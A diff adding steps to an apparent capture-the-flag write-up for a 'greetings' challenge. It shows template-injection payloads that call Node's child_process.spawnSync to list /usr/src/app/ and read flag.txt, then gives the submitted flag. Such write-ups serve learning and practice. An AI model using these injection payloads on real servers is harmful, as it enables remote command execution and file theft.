@@ -57,6 +57,26 @@ Syntax Error: Unexpected token
 The website seems to be stored in the `/usr/src/app/` directory of the server. I then type:
 
 ```txt
+ #{process.mainModule.require('child_process').spawnSync('ls', ['/usr/src/app/']).stdout}
+```
+
+Which results in:
+
+![](../images/greetings-part-9.png)
+
+I then type:
+
+```txt
+#{process.mainModule.require('child_process').spawnSync('cat', ['/usr/src/app/flag.txt']).stdout}
+```
+
+Which results in:
+
+![](../images/greetings-part-10.png)
+
+I then submit `TFCCTF{a6afc419a8d18207ca9435a38cb64f42fef108ad2b24c55321be197b767f0409}` and solve the challenge.
+
+
 
 
 
